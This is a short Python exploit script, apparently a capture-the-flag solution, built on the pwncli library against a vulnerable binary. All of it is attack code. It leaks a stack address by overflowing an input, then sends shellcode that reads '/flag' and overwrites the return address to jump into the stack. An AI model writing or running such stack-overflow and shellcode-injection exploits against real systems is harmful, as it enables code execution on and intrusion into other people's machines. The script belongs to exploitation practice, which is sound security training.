#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']

p.sendafter("well you input:\n", "a"*0x20)
m = p.recvuntil("\x7f")

addr = u64_ex(m[-6:])
log_address("stack addr", addr)

p.sendlineafter("EASY PWN PWN PWN~\n", flat({0:asm(shellcraft.cat('/flag')), 0x58: addr - 0x50}))

p.interactive()